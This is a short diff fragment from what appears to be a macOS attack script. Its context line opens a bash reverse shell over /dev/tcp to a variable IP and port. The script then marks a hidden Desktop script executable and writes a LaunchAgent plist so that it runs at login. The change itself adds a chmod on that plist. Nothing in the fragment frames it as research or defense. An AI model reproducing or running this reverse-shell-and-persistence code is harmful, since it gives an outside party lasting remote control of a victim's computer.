@@ -8,6 +8,8 @@ bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT <&1 &'
 
 chmod +x /Users/$USR/Desktop/.runonstartupMACOS.sh
 
+chmod 644 ~/Library/LaunchAgents/com.4lpndev.strt.plist
+
 cat <<EOF > ~/Library/LaunchAgents/com.4lpndev.strt.plist
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
